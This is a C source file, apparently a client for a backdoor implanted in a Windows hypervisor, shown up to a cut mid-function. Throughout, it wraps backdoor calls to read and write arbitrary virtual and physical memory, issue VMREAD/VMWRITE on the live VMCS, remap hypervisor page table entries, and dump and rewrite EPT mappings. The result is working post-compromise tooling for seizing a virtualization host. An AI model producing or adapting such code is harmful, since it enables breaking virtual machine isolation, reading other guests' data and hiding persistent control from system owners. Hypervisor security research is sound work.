#include "stdafx.h"
#include "vmcs_fields.h"

#ifdef _X86_

#error x86 is not supported

#endif

#define HV_PTE_BASE 0xffffff0000000000

#define DRIVER_HOOK_SIZE 24
#define DRIVER_HOOK_SIZE_MAX 0x50

typedef struct _HVBD_INFO
{
    uint64_t cr0;
    uint64_t cr3;
    uint64_t cr4;
    uint64_t idt_base;
    uint32_t idt_limit;
    uint64_t gs_base;
    uint64_t vm_exit_addr;
    uint64_t vm_exit_count;

} HVBD_INFO;

#pragma pack(1)

typedef struct _IDT_ENTRY
{
    uint16_t low_offset;
    uint16_t segment_selector;
    uint16_t access;
    uint16_t high_offset;
    uint32_t offset32;
    uint32_t reserved;

} IDT_ENTRY,
*PIDT_ENTRY;

#pragma pack()

#define PROCESSOR_START_BLOCK_ADDR 0x1000

#pragma pack(push, 2)

typedef struct _FAR_JMP_16
{
    uint8_t OpCode;  // = 0xe9
    uint16_t Offset;

} FAR_JMP_16;

typedef struct _PSEUDO_DESCRIPTOR_32
{
    uint16_t Limit;
    uint32_t Base;

} PSEUDO_DESCRIPTOR_32;

#pragma pack(pop)

typedef struct _PROCESSOR_START_BLOCK *PPROCESSOR_START_BLOCK;
typedef struct _PROCESSOR_START_BLOCK
{
    // The block starts with a jmp instruction to the end of the block
    FAR_JMP_16 Jmp;

    // Completion flag is set to non-zero when the target processor has
    // started
    uint32_t CompletionFlag;

    // Pseudo descriptors for GDT and IDT
    PSEUDO_DESCRIPTOR_32 Gdt32;
    PSEUDO_DESCRIPTOR_32 Idt32;

    // ...

} PROCESSOR_START_BLOCK;

// other fields offsets
#define PROCESSOR_START_BLOCK_HalpLMStub    0x70
#define PROCESSOR_START_BLOCK_Cr3           0xa0

bool m_quiet = false;
//--------------------------------------------------------------------------------------
int backdoor_invalidate_caches(void)
{
    uint64_t arg0 = 0;
    uint64_t arg1 = 0;
    uint64_t arg2 = 0;

    uint64_t ret = backdoor_call(HVBD_C_INVL_CACHES, &arg0, &arg1, &arg2);
    if (ret != HVBD_E_SUCCESS)
    {
        printf(__FUNCTION__"() ERROR: backdoor returned error 0x%llx\n", ret);
        return -1;
    }

    return 0;
}
//--------------------------------------------------------------------------------------
int backdoor_info(HVBD_INFO *info)
{
    uint64_t arg0 = 0;
    uint64_t arg1 = 0;
    uint64_t arg2 = 0;

    // query backdoor information
    uint64_t ret = backdoor_call(HVBD_C_INFO, &arg0, &arg1, &arg2);
    if (ret == HVBD_E_NO_BACKDOOR)
    {
        printf(__FUNCTION__"() ERROR: backdoor is not present\n");
        return -1;
    }

    if (ret != HVBD_E_SUCCESS)
    {
        printf(__FUNCTION__"() ERROR: backdoor returned error 0x%llx\n", ret);
        return -1;
    }

    info->cr0 = arg0;
    info->cr3 = arg1;
    info->cr4 = arg2;

    // query extended backdoor information
    ret = backdoor_call(HVBD_C_INFO_EX, &arg0, &arg1, &arg2);
    if (ret != HVBD_E_SUCCESS)
    {
        printf(__FUNCTION__"() ERROR: backdoor returned error 0x%llx\n", ret);
        return -1;
    }

    info->idt_base = (arg0 >> 16) | (arg1 << 48);
    info->idt_limit = arg0 & 0xffff;
    info->gs_base = arg2;

    // query extended backdoor information
    ret = backdoor_call(HVBD_C_INFO_EX2, &arg0, &arg1, &arg2);
    if (ret != HVBD_E_SUCCESS)
    {
        printf(__FUNCTION__"() ERROR: backdoor returned error 0x%llx\n", ret);
        return -1;
    }

    info->vm_exit_addr = arg0;
    info->vm_exit_count = arg1;

    return 0;
}
//--------------------------------------------------------------------------------------
int backdoor_virt_read(uint64_t addr, void *buff, int size)
{
    int temp_size = _ALIGN_UP(size, sizeof(uint64_t));

    // allocate temporary qword aligned buffer
    uint8_t *temp = (uint8_t *)malloc(temp_size);
    if (temp == NULL)
    {
        return -1;
    }

    for (int i = 0; i < temp_size; i += sizeof(uint64_t))
    {
        uint64_t arg0 = addr + i;
        uint64_t arg1 = 0;
        uint64_t arg2 = 0;
        uint64_t arg3 = 0;
        
        uint64_t ret = 0;
        uint32_t retry = 0;

        while (retry < 100)
        {
            retry += 1;

            // read single memory qword
            if ((ret = backdoor_call(HVBD_C_VIRT_READ, &arg0, &arg1, &arg2)) == HVBD_E_NO_BACKDOOR)
            {
                printf(__FUNCTION__"() ERROR: backdoor is not present\n");

                free(temp);
                return -1;
            }

            if (ret == HVBD_E_INVALID_PARAM)
            {
                continue;
            }

            break;
        }    

        if (ret != HVBD_E_SUCCESS)
        {
            printf(__FUNCTION__"() ERROR: backdoor returned error 0x%llx\n", ret);

            free(temp);
            return -1;
        }    

        *(uint64_t *)(temp + i) = arg1;
    }    

    // copy readed data to calee buffer
    memcpy(buff, temp, size);

    free(temp);
    return 0;
}
//--------------------------------------------------------------------------------------
int backdoor_virt_read_64(uint64_t addr, uint64_t *val)
{
    uint64_t arg0 = addr;
    uint64_t arg1 = 0;
    uint64_t arg2 = 0;
    uint64_t arg3 = 0;

    // read single memory qword
    uint64_t ret = backdoor_call(HVBD_C_VIRT_READ, &arg0, &arg1, &arg2);
    if (ret == HVBD_E_NO_BACKDOOR)
    {
        printf(__FUNCTION__"() ERROR: backdoor is not present\n");
        return -1;
    }

    if (ret != HVBD_E_SUCCESS)
    {
        printf(__FUNCTION__"() ERROR: backdoor returned error 0x%llx\n", ret);
        return -1;
    }

    *val = arg1;
    
    return 0;
}
//--------------------------------------------------------------------------------------
int backdoor_virt_read_32(uint64_t addr, uint32_t *val)
{
    uint64_t temp = 0;

    if (backdoor_virt_read_64(addr, &temp) == 0)
    {
        *val = (uint32_t)temp;

        return 0;
    }

    return -1;
}
//--------------------------------------------------------------------------------------
int backdoor_virt_read_16(uint64_t addr, uint16_t *val)
{
    uint64_t temp = 0;

    if (backdoor_virt_read_64(addr, &temp) == 0)
    {
        *val = (uint16_t)temp;
        
        return 0;
    }

    return -1;
}
//--------------------------------------------------------------------------------------
int backdoor_virt_read_8(uint64_t addr, uint8_t *val)
{
    uint64_t temp = 0;

    if (backdoor_virt_read_64(addr, &temp) == 0)
    {
        *val = (uint8_t)temp;
        
        return 0;
    }

    return -1;
}
//--------------------------------------------------------------------------------------
int backdoor_virt_write(uint64_t addr, void *buff, int size)
{
    int temp_size = _ALIGN_UP(size, sizeof(uint64_t));

    // allocate temporary qword aligned buffer
    uint8_t *temp = (uint8_t *)malloc(temp_size);
    if (temp == NULL)
    {
        return -1;
    }

    // read original memory contents
    if (backdoor_virt_read(addr, temp, temp_size) != 0)
    {
        free(temp);
        return -1;
    }

    // copy data to write into the buffer
    memcpy(temp, buff, size);

    for (int i = 0; i < temp_size; i += sizeof(uint64_t))
    {
        uint64_t arg0 = addr + i;
        uint64_t arg1 = *(uint64_t *)(temp + i);
        uint64_t arg2 = 0;
        uint64_t arg3 = 0;

        // write single memory qword
        uint64_t ret = backdoor_call(HVBD_C_VIRT_WRITE, &arg0, &arg1, &arg2);
        if (ret == HVBD_E_NO_BACKDOOR)
        {
            free(temp);
            return -1;
        }

        if (ret != HVBD_E_SUCCESS)
        {
            free(temp);
            return -1;
        }
    }    

    free(temp);
    return 0;
}
//--------------------------------------------------------------------------------------
int backdoor_virt_write_64(uint64_t addr, uint64_t val)
{
    uint64_t arg0 = addr;
    uint64_t arg1 = val;
    uint64_t arg2 = 0;
    uint64_t arg3 = 0;

    // write single memory qword
    uint64_t ret = backdoor_call(HVBD_C_VIRT_WRITE, &arg0, &arg1, &arg2);
    if (ret == HVBD_E_NO_BACKDOOR)
    {
        printf(__FUNCTION__"() ERROR: backdoor is not present\n");
        return -1;
    }

    if (ret != HVBD_E_SUCCESS)
    {
        printf(__FUNCTION__"() ERROR: backdoor returned error 0x%llx\n", ret);
        return -1;
    }
    
    return 0;
}
//--------------------------------------------------------------------------------------
int backdoor_virt_write_32(uint64_t addr, uint32_t val)
{
    uint64_t temp = 0;

    if (backdoor_virt_read_64(addr, &temp) == 0)
    {
        temp = (temp & 0xffffffff00000000) | val;

        if (backdoor_virt_write_64(addr, temp) == 0)
        {
            return 0;
        }
    }

    return -1;
}
//--------------------------------------------------------------------------------------
int backdoor_virt_write_16(uint64_t addr, uint16_t val)
{
    uint64_t temp = 0;

    if (backdoor_virt_read_64(addr, &temp) == 0)
    {
        temp = (temp & 0xffffffffffff0000) | val;

        if (backdoor_virt_write_64(addr, temp) == 0)
        {
            return 0;
        }
    }

    return -1;
}
//--------------------------------------------------------------------------------------
int backdoor_virt_write_8(uint64_t addr, uint8_t val)
{
    uint64_t temp = 0;

    if (backdoor_virt_read_64(addr, &temp) == 0)
    {
        temp = (temp & 0xffffffffffffff00) | val;

        if (backdoor_virt_write_64(addr, temp) == 0)
        {
            return 0;
        }
    }

    return -1;
}
//--------------------------------------------------------------------------------------
int backdoor_virt_map(uint64_t pte_index, uint64_t phys_addr)
{
    uint64_t pte_addr = HV_PTE_BASE + (pte_index * sizeof(uint64_t));
    uint64_t pte_data = (phys_addr & 0xfffffffff000) | PTE_PRESENT | PTE_RW;

    // write page table entry
    if (backdoor_virt_write_64(pte_addr, pte_data) != 0)
    {
        return -1;
    }

    backdoor_invalidate_caches();

    SwitchToThread();

    return 0;
}
//--------------------------------------------------------------------------------------
int backdoor_virt_unmap(uint64_t pte_index)
{
    uint64_t pte_addr = HV_PTE_BASE + (pte_index * sizeof(uint64_t));

    // write page table entry
    if (backdoor_virt_write_64(pte_addr, 0) != 0)
    {
        return -1;
    }

    backdoor_invalidate_caches();

    SwitchToThread();

    return 0;
}
//--------------------------------------------------------------------------------------
int backdoor_phys_read(uint64_t addr, void *buff, int size)
{
    uint64_t temp_addr = _ALIGN_DOWN(addr, PAGE_SIZE);
    uint64_t temp_size = _ALIGN_UP(addr - temp_addr + size, PAGE_SIZE);

    // allocate temporary qword aligned buffer
    uint8_t *temp = (uint8_t *)malloc(temp_size);
    if (temp == NULL)
    {
        return -1;
    }

    for (int i = 0; i < temp_size; i += PAGE_SIZE)
    {
        // map physical memory page at zero VA
        backdoor_virt_map(0, temp_addr + i);        

        // read page contents from virtual memory
        if (backdoor_virt_read(0, temp + i, PAGE_SIZE) != 0)
        {
            free(temp);
            return -1;            
        }
        
        // unmap physical memory page
        backdoor_virt_unmap(0);   
    }

    // copy readed data to calee buffer
    memcpy(buff, temp + (addr - temp_addr), size);

    free(temp);
    return 0;
}
//--------------------------------------------------------------------------------------
int backdoor_phys_read_64(uint64_t addr, uint64_t *val)
{
    return backdoor_phys_read(addr, (void *)val, sizeof(uint64_t));
}
//--------------------------------------------------------------------------------------
int backdoor_phys_read_32(uint64_t addr, uint32_t *val)
{
    return backdoor_phys_read(addr, (void *)val, sizeof(uint32_t));   
}
//--------------------------------------------------------------------------------------
int backdoor_phys_read_16(uint64_t addr, uint16_t *val)
{
    return backdoor_phys_read(addr, (void *)val, sizeof(uint16_t));
}
//--------------------------------------------------------------------------------------
int backdoor_phys_read_8(uint64_t addr, uint8_t *val)
{
    return backdoor_phys_read(addr, (void *)val, sizeof(uint8_t));
}
//--------------------------------------------------------------------------------------
int backdoor_phys_write(uint64_t addr, void *buff, int size)
{
    uint64_t temp_addr = _ALIGN_DOWN(addr, PAGE_SIZE);
    uint64_t temp_size = _ALIGN_UP(addr - temp_addr + size, PAGE_SIZE);

    // allocate temporary qword aligned buffer
    uint8_t *temp = (uint8_t *)malloc(temp_size);
    if (temp == NULL)
    {
        return -1;
    }

    for (int i = 0; i < temp_size; i += PAGE_SIZE)
    {
        // map physical memory page at zero VA
        backdoor_virt_map(0, temp_addr + i);        

        // read page contents from virtual memory
        if (backdoor_virt_read(0, temp + i, PAGE_SIZE) != 0)
        {
            free(temp);
            return -1;            
        }
        
        // unmap physical memory page
        backdoor_virt_unmap(0);   
    }

    // copy new data to the buffer
    memcpy(temp + (addr - temp_addr), buff, size);

    for (int i = 0; i < temp_size; i += PAGE_SIZE)
    {
        // map physical memory page at zero VA
        backdoor_virt_map(0, temp_addr + i);        

        // write page contents into virtual memory
        if (backdoor_virt_write(0, temp + i, PAGE_SIZE) != 0)
        {
            free(temp);
            return -1;            
        }
        
        // unmap physical memory page
        backdoor_virt_unmap(0);   
    }

    free(temp);
    return 0;
}
//--------------------------------------------------------------------------------------
int backdoor_phys_write_64(uint64_t addr, uint64_t val)
{
    return backdoor_phys_write(addr, (void *)&val, sizeof(uint64_t));
}
//--------------------------------------------------------------------------------------
int backdoor_phys_write_32(uint64_t addr, uint32_t val)
{
    return backdoor_phys_write(addr, (void *)&val, sizeof(uint32_t));
}
//--------------------------------------------------------------------------------------
int backdoor_phys_write_16(uint64_t addr, uint16_t val)
{
    return backdoor_phys_write(addr, (void *)&val, sizeof(uint16_t));
}
//--------------------------------------------------------------------------------------
int backdoor_phys_write_8(uint64_t addr, uint8_t val)
{
    return backdoor_phys_write(addr, (void *)&val, sizeof(uint8_t));
}
//--------------------------------------------------------------------------------------
int backdoor_vmread(uint64_t val, uint64_t *data)
{
    uint64_t arg0 = val;
    uint64_t arg1 = 0;
    uint64_t arg2 = 0;

    // execute VMREAD instruction on current VMCS
    uint64_t ret = backdoor_call(HVBD_C_VMREAD, &arg0, &arg1, &arg2);
    if (ret != HVBD_E_SUCCESS)
    {
        printf(__FUNCTION__"() ERROR: backdoor returned error 0x%llx\n", ret);
        return -1;
    }

    *data = arg1;

    return 0;
}
//--------------------------------------------------------------------------------------
int backdoor_vmwrite(uint64_t val, uint64_t data)
{
    uint64_t arg0 = val;
    uint64_t arg1 = data;
    uint64_t arg2 = 0;

    // execute VMRITE instruction on current VMCS
    uint64_t ret = backdoor_call(HVBD_C_VMWRITE, &arg0, &arg1, &arg2);
    if (ret != HVBD_E_SUCCESS)
    {
        printf(__FUNCTION__"() ERROR: backdoor returned error 0x%llx\n", ret);
        return -1;
    }

    return 0;
}
//--------------------------------------------------------------------------------------
int backdoor_ept_list(EPT_INFO *ept_list)
{
    uint64_t arg0 = 0;
    uint64_t arg1 = 0;
    uint64_t arg2 = 0;    

    printf("[+] Collecting EPT address list...\n");

    // start collecting EPT
    uint64_t ret = backdoor_call(HVBD_C_EPT_GET_START, &arg0, &arg1, &arg2);
    if (ret != HVBD_E_SUCCESS)
    {
        printf(__FUNCTION__"() ERROR: backdoor returned error 0x%llx\n", ret);
        return -1;
    }    

    for (int i = 10; i > 0; i -= 1)
    {
        printf("\r> %d   ", i);

        Sleep(1000);
    }

    printf("\r");

    // stop collecting EPT
    ret = backdoor_call(HVBD_C_EPT_GET_STOP, &arg0, &arg1, &arg2);
    if (ret != HVBD_E_SUCCESS)
    {
        printf(__FUNCTION__"() ERROR: backdoor returned error 0x%llx\n", ret);
        return -1;
    }    

    printf("[+] Reading collected data from 0x%llx...\n", arg0);

    if (backdoor_virt_read(arg0, ept_list, sizeof(EPT_INFO) * EPT_MAX_COUNT) != 0)
    {
        return -1;
    }    

    return 0;
}
//--------------------------------------------------------------------------------------
int backdoor_ept_dump(uint64_t pml4_addr)
{
    int ret = -1;
    X64_PAGE_MAP_AND_DIRECTORY_POINTER_2MB_4K *PML4_page = NULL, *PDPT_page = NULL;
    X64_PAGE_DIRECTORY_ENTRY_4K *PD_page = NULL;
    X64_PAGE_TABLE_ENTRY_4K *PT_page = NULL;
    
    if ((PML4_page = (X64_PAGE_MAP_AND_DIRECTORY_POINTER_2MB_4K *)malloc(PAGE_SIZE)) == NULL)
    {
        goto _end;
    }

    if ((PDPT_page = (X64_PAGE_MAP_AND_DIRECTORY_POINTER_2MB_4K *)malloc(PAGE_SIZE)) == NULL)
    {
        goto _end;
    }

    if ((PD_page = (X64_PAGE_DIRECTORY_ENTRY_4K *)malloc(PAGE_SIZE)) == NULL)
    {
        goto _end;
    }

    if ((PT_page = (X64_PAGE_TABLE_ENTRY_4K *)malloc(PAGE_SIZE)) == NULL)
    {
        goto _end;
    }    

    // read PML4 memory page
    if (backdoor_phys_read(PML4_ADDRESS(pml4_addr), PML4_page, PAGE_SIZE) != 0)
    {
        goto _end;
    }

    X64_PAGE_MAP_AND_DIRECTORY_POINTER_2MB_4K *PML4_entry = PML4_page;

    uint64_t host_addr = 0, guest_addr = 0;

    // enumerate PML4 entries
    for (uint64_t i_1 = 0; i_1 < PAGE_SIZE / sizeof(uint64_t); i_1 += 1)
    {
        X64_PAGE_MAP_AND_DIRECTORY_POINTER_2MB_4K *PDPT_entry = PDPT_page;

        if (!EPT_PRESENT(PML4_entry->Uint64))
        {
            PML4_entry += 1;
            continue;
        }

        printf("PML4E #%.4x: 0x%.16llx\n", i_1, PML4_entry->Uint64);
        
        // read PDPT memory page
        if (backdoor_phys_read(PFN_TO_PAGE(PML4_entry->Bits.PageTableBaseAddress), 
                                           PDPT_page, PAGE_SIZE) != 0)
        {
            goto _end;
        }

        // enumerate PDPT entries
        for (uint64_t i_2 = 0; i_2 < PAGE_SIZE / sizeof(uint64_t); i_2 += 1)
        {                        
            if (!EPT_PRESENT(PDPT_entry->Uint64))
            {
                PDPT_entry += 1;
                continue;
            }

            printf("PDPTE #%.4x: 0x%.16llx\n", i_2, PDPT_entry->Uint64);

            // check for page size flag
            if ((PDPT_entry->Uint64 & PDPTE_PDE_PS) == 0)
            {
                X64_PAGE_DIRECTORY_ENTRY_4K *PD_entry = PD_page;

                // read PDE memory page
                if (backdoor_phys_read(PFN_TO_PAGE(PDPT_entry->Bits.PageTableBaseAddress),
                                                   PD_page, PAGE_SIZE) != 0)
                {
                    goto _end;
                }

                // enumerate PDE entries
                for (uint64_t i_3 = 0; i_3 < PAGE_SIZE / sizeof(uint64_t); i_3 += 1)
                {
                    if (!EPT_PRESENT(PD_entry->Uint64))
                    {
                        PD_entry += 1;
                        continue;
                    }

                    printf("  PDE #%.4x: 0x%.16llx\n", i_3, PD_entry->Uint64);

                    // check for page size flag
                    if ((PD_entry->Uint64 & PDPTE_PDE_PS) == 0)
                    {
                        X64_PAGE_TABLE_ENTRY_4K *PT_entry = PT_page;

                        // read PTE memory page
                        if (backdoor_phys_read(PFN_TO_PAGE(PD_entry->Bits.PageTableBaseAddress),
                                                           PT_page, PAGE_SIZE) != 0)
                        {
                            goto _end;
                        }

                        // enumerate PTE entries
                        for (uint64_t i_4 = 0; i_4 < PAGE_SIZE / sizeof(uint64_t); i_4 += 1)
                        {
                            if (!EPT_PRESENT(PT_entry->Uint64))
                            {
                                PT_entry += 1;
                                continue;
                            }                            

                            // 4 Kb page
                            host_addr = PFN_TO_PAGE(PT_entry->Bits.PageTableBaseAddress);
                            guest_addr = PML4_ADDR(i_1) | PDPT_ADDR(i_2) | PDE_ADDR(i_3) | PTE_ADDR(i_4);                            
                            
                            printf(
                                "             0x%.16llx -> 0x%.16llx 4K %s%s%s %s\n",
                                guest_addr, host_addr,
                                EPT_R(PT_entry->Uint64) ? "R" : "", EPT_W(PT_entry->Uint64) ? "W" : "", 
                                EPT_X(PT_entry->Uint64) ? "X" : "",
                                host_addr != guest_addr ? "*" : ""
                            );

                            PT_entry += 1;
                        }
                    }
                    else
                    {                        
                        // 2Mb page
                        host_addr = PFN_TO_PAGE(PD_entry->Bits.PageTableBaseAddress);
                        guest_addr = PML4_ADDR(i_1) | PDPT_ADDR(i_2) | PDE_ADDR(i_3);
                            
                        printf(
                            "             0x%.16llx -> 0x%.16llx 2M %s%s%s %s\n",
                            guest_addr, host_addr,
                            EPT_R(PD_entry->Uint64) ? "R" : "", EPT_W(PD_entry->Uint64) ? "W" : "", 
                            EPT_X(PD_entry->Uint64) ? "X" : "",
                            host_addr != guest_addr ? "*" : ""
                        );
                    }

                    printf("\n");

                    PD_entry += 1;
                }
            }
            else
            {
                // 1Gb page
                host_addr = PFN_TO_PAGE(PDPT_entry->Bits.PageTableBaseAddress);
                guest_addr = PML4_ADDR(i_1) | PDPT_ADDR(i_2);

                printf(
                    "             0x%.16llx -> 0x%.16llx 1G %s%s%s %s\n",
                    guest_addr, host_addr,
                    EPT_R(PDPT_entry->Uint64) ? "R" : "", EPT_W(PDPT_entry->Uint64) ? "W" : "", 
                    EPT_X(PDPT_entry->Uint64) ? "X" : "",
                    host_addr != guest_addr ? "*" : ""
                );
            }

            printf("\n");

            PDPT_entry += 1;
        }

        printf("\n");

        PML4_entry += 1;
    }

    ret = 0;

_end:

    if (PT_page)
    {
        free(PT_page);
    }

    if (PD_page)
    {
        free(PD_page);
    }

    if (PDPT_page)
    {
        free(PDPT_page);
    }

    if (PML4_page)
    {
        free(PML4_page);
    }

    return ret;
}
//--------------------------------------------------------------------------------------
int backdoor_phys_translate(uint64_t addr, uint64_t *ret, uint64_t pml4_addr)
{
    X64_PAGE_MAP_AND_DIRECTORY_POINTER_2MB_4K PML4_entry;    

    if (!m_quiet)
    {
        printf(__FUNCTION__"(): EPT PML4 is at 0x%llx, VA is 0x%llx\n", pml4_addr, addr);
    }    

    if (backdoor_phys_read_64(
        PML4_ADDRESS(pml4_addr) + PML4_INDEX(addr) * sizeof(uint64_t),
        &PML4_entry.Uint64) != 0)
    {
        return -1;
    }

    if (!m_quiet)
    {
        printf(
            "EPT PML4E 0x%llx[0x%llx]: 0x%llx\n", 
            PML4_ADDRESS(pml4_addr), PML4_INDEX(addr), PML4_entry.Uint64
        );
    }

    if (!EPT_PRESENT(PML4_entry.Uint64))
    {
        printf("ERROR: EPT PML4E for 0x%llx is not present\n", addr);
        return -1;
    }

    X64_PAGE_MAP_AND_DIRECTORY_POINTER_2MB_4K PDPT_entry;

    if (backdoor_phys_read_64(
        PFN_TO_PAGE(PML4_entry.Bits.PageTableBaseAddress) + PDPT_INDEX(addr) * sizeof(uint64_t),
        &PDPT_entry.Uint64) != 0)
    {
        return -1;
    }

    if (!m_quiet)
    {
        printf(
            "EPT PDPTE 0x%llx[0x%llx]: 0x%llx\n", 
            PFN_TO_PAGE(PML4_entry.Bits.PageTableBaseAddress), PDPT_INDEX(addr), PDPT_entry.Uint64
        );
    }

    if (!EPT_PRESENT(PDPT_entry.Uint64))
    {
        printf("ERROR: EPT PDPTE for 0x%llx is not present\n", addr);
        return -1;
    }

    // check for page size flag
    if ((PDPT_entry.Uint64 & PDPTE_PDE_PS) == 0)
    {
        X64_PAGE_DIRECTORY_ENTRY_4K PD_entry;

        if (backdoor_phys_read_64(
            PFN_TO_PAGE(PDPT_entry.Bits.PageTableBaseAddress) + PDE_INDEX(addr) * sizeof(uint64_t),
            &PD_entry.Uint64) != 0)
        {
            return -1;
        }

        if (!m_quiet)
        {
            printf(
                "  EPT PDE 0x%llx[0x%llx]: 0x%llx\n", 
                PFN_TO_PAGE(PDPT_entry.Bits.PageTableBaseAddress), PDE_INDEX(addr), 
                PD_entry.Uint64
            );
        }

        if (!EPT_PRESENT(PD_entry.Uint64))
        {
            printf("ERROR: EPT PDE for 0x%llx is not present\n", addr);
            return -1;
        }

        // check for page size flag
        if ((PD_entry.Uint64 & PDPTE_PDE_PS) == 0)
        {
            X64_PAGE_TABLE_ENTRY_4K PT_entry;

            if (backdoor_phys_read_64(
                PFN_TO_PAGE(PD_entry.Bits.PageTableBaseAddress) + PTE_INDEX(addr) * sizeof(uint64_t),
                &PT_entry.Uint64) != 0)
            {
                return -1;
            }

            if (!m_quiet)
            {
                printf(
                    "  EPT PTE 0x%llx[0x%llx]: 0x%llx\n", 
                    PFN_TO_PAGE(PD_entry.Bits.PageTableBaseAddress), PTE_INDEX(addr), 
                    PT_entry.Uint64
                );
            }

            if (EPT_PRESENT(PT_entry.Uint64))
            {
                *ret = PFN_TO_PAGE(PT_entry.Bits.PageTableBaseAddress) +
                       PAGE_OFFSET_4K(addr);

                return 0;
            }
            else
            {
                printf("ERROR: EPT PTE for 0x%llx is not present\n", addr);
            }
        }
        else
        {
            *ret = PFN_TO_PAGE(PD_entry.Bits.PageTableBaseAddress) +
                   PAGE_OFFSET_2M(addr);

            return 0;
        }                  
    }
    else
    {
        printf("ERROR: 1G page\n");
    }

    return -1;
}
//--------------------------------------------------------------------------------------
int backdoor_phys_update(uint64_t addr, uint64_t entry, uint64_t *old, uint64_t pml4_addr)
{
    uint64_t phys_addr = 0;

    X64_PAGE_MAP_AND_DIRECTORY_POINTER_2MB_4K PML4_entry;    

    if (!m_quiet)
    {
        printf(__FUNCTION__"(): EPT PML4 is at 0x%llx, VA is 0x%llx\n", pml4_addr, addr);
    }    

    if (backdoor_phys_read_64(
        PML4_ADDRESS(pml4_addr) + PML4_INDEX(addr) * sizeof(uint64_t),
        &PML4_entry.Uint64) != 0)
    {
        return -1;
    }

    if (!m_quiet)
    {
        printf(
            "EPT PML4E 0x%llx[0x%llx]: 0x%llx\n", 
            PML4_ADDRESS(pml4_addr), PML4_INDEX(addr), PML4_entry.Uint64
        );
    }

    if (!EPT_PRESENT(PML4_entry.Uint64))
    {
        printf("ERROR: EPT PML4E for 0x%llx is not present\n", addr);
        return -1;
    }

    X64_PAGE_MAP_AND_DIRECTORY_POINTER_2MB_4K PDPT_entry;

    if (backdoor_phys_read_64(
        PFN_TO_PAGE(PML4_entry.Bits.PageTableBaseAddress) + PDPT_INDEX(addr) * sizeof(uint64_t),
        &PDPT_entry.Uint64) != 0)
    {
        return -1;
    }

    if (!m_quiet)
    {
        printf(
            "EPT PDPTE 0x%llx[0x%llx]: 0x%llx\n", 
            PFN_TO_PAGE(PML4_entry.Bits.PageTableBaseAddress), PDPT_INDEX(addr), PDPT_entry.Uint64
        );
    }

    if (!EPT_PRESENT(PDPT_entry.Uint64))
    {
        printf("ERROR: EPT PDPTE for 0x%llx is not present\n", addr);
        return -1;
    }

    // check for page size flag
    if ((PDPT_entry.Uint64 & PDPTE_PDE_PS) == 0)
    {
        X64_PAGE_DIRECTORY_ENTRY_4K PD_entry;

        if (backdoor_phys_read_64(
            PFN_TO_PAGE(PDPT_entry.Bits.PageTableBaseAddress) + PDE_INDEX(addr) * sizeof(uint64_t),
            &PD_entry.Uint64) != 0)
        {
            return -1;
        }

        if (!m_quiet)
        {
            printf(
                "  EPT PDE 0x%llx[0x%llx]: 0x%llx\n", 
                PFN_TO_PAGE(PDPT_entry.Bits.PageTableBaseAddress), PDE_INDEX(addr), 
                PD_entry.Uint64
            );
        }

        if (!EPT_PRESENT(PD_entry.Uint64))
        {
            printf("ERROR: EPT PDE for 0x%llx is not present\n", addr);
            return -1;
        }

        // check for page size flag
        if ((PD_entry.Uint64 & PDPTE_PDE_PS) == 0)
        {
            phys_addr = PFN_TO_PAGE(PD_entry.Bits.PageTableBaseAddress) + PTE_INDEX(addr) * sizeof(uint64_t);

            if (backdoor_phys_read_64(phys_addr, old) != 0)
            {
                return -1;
            }

            if (!m_quiet)
            {
                printf(
                    "  PTE 0x%llx[0x%llx]: 0x%llx -> 0x%llx\n", 
                    PFN_TO_PAGE(PD_entry.Bits.PageTableBaseAddress), PTE_INDEX(addr), 
                    *old, entry
                );
            }

            if (backdoor_phys_write_64(phys_addr, entry) != 0)
            {
                return -1;
            }

            return 0;
        }
        else
        {
            printf("ERROR: 2M page");
        }                  
    }
    else
    {
        printf("ERROR: 1G page\n");
    }

    return -1;
}
//--------------------------------------------------------------------------------------
int backdoor_virt_translate(uint64_t addr, uint64_t *ret, uint64_t pml4_addr, uint64_t ept_addr)
{
    uint64_t phys_addr = 0;
    
    X64_PAGE_MAP_AND_DIRECTORY_POINTER_2MB_4K PML4_entry;    

    if (!m_quiet)
    {
        printf(__FUNCTION__"(): PML4 is at 0x%llx, VA is 0x%llx\n", pml4_addr, addr);
    }

    phys_addr = PML4_ADDRESS(pml4_addr) + PML4_INDEX(addr) * sizeof(uint64_t);

    if (ept_addr != 0)
    {
        if (backdoor_phys_translate(phys_addr, &phys_addr, ept_addr) != 0)
        {
            return -1;
        }
    }

    if (backdoor_phys_read_64(phys_addr, &PML4_entry.Uint64) != 0)
    {
        return -1;
    }

    if (!m_quiet)
    {
        printf(
            "PML4E 0x%llx[0x%llx]: 0x%llx\n", 
            PML4_ADDRESS(pml4_addr), PML4_INDEX(addr), PML4_entry.Uint64
        );
    }

    if (PML4_entry.Bits.Present == 0)
    {
        printf("ERROR: PML4E for 0x%llx is not present\n", addr);
        return -1;
    }

    X64_PAGE_MAP_AND_DIRECTORY_POINTER_2MB_4K PDPT_entry;

    phys_addr = PFN_TO_PAGE(PML4_entry.Bits.PageTableBaseAddress) + PDPT_INDEX(addr) * sizeof(uint64_t);

    if (ept_addr != 0)
    {
        if (backdoor_phys_translate(phys_addr, &phys_addr, ept_addr) != 0)
        {
            return -1;
        }
    }

    if (backdoor_phys_read_64(phys_addr, &PDPT_entry.Uint64) != 0)
    {
        return -1;
    }

    if (!m_quiet)
    {
        printf(
            "PDPTE 0x%llx[0x%llx]: 0x%llx\n", 
            PFN_TO_PAGE(PML4_entry.Bits.PageTableBaseAddress), PDPT_INDEX(addr), PDPT_entry.Uint64
        );
    }

    if (PDPT_entry.Bits.Present == 0)
    {
        printf("ERROR: PDPTE for 0x%llx is not present\n", addr);
        return -1;
    }

    // check for page size flag
    if ((PDPT_entry.Uint64 & PDPTE_PDE_PS) == 0)
    {
        X64_PAGE_DIRECTORY_ENTRY_4K PD_entry;

        phys_addr = PFN_TO_PAGE(PDPT_entry.Bits.PageTableBaseAddress) + PDE_INDEX(addr) * sizeof(uint64_t);

        if (ept_addr != 0)
        {
            if (backdoor_phys_translate(phys_addr, &phys_addr, ept_addr) != 0)
            {
                return -1;
            }
        }

        if (backdoor_phys_read_64(phys_addr, &PD_entry.Uint64) != 0)
        {
            return -1;
        }

        if (!m_quiet)
        {
            printf(
                "  PDE 0x%llx[0x%llx]: 0x%llx\n", 
                PFN_TO_PAGE(PDPT_entry.Bits.PageTableBaseAddress), PDE_INDEX(addr), 
                PD_entry.Uint64
            );
        }

        if (PD_entry.Bits.Present == 0)
        {
            printf("ERROR: PDE for 0x%llx is not present\n", addr);
            return -1;
        }

        // check for page size flag
        if ((PD_entry.Uint64 & PDPTE_PDE_PS) == 0)
        {
